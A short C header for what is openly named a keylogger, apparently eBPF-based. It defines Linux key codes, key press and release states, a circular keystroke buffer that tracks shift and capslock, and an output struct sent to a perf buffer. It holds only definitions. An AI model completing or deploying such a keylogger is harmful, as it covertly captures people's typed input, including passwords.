#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#define BUFFER_SIZE 32

// Key event values
// @ https://github.com/torvalds/linux/blob/v6.8/include/uapi/linux/input-event-codes.h
#define KEY_BACKSPACE 14
#define KEY_TAB       15
#define KEY_ENTER     28
#define KEY_LEFTSHIFT 42
#define KEY_RIGHTSHIFT 54
#define KEY_CAPSLOCK  58

// Key state
#define KEY_RELEASE   0
#define KEY_PRESS     1

struct key_data {
    char buffer[BUFFER_SIZE];   // the circular buffer
    __u32 pos;  // curr position in buffer
    __u32 size; // curr size of buffer
    bool shift_pressed; // bool to track the state of the shift key
    bool capslock_on;   // bool to track capslock state
};

// the output data to send to the perf buffer
struct output_data {
    char buffer[BUFFER_SIZE];
};

#endif // KEYLOGGER_H
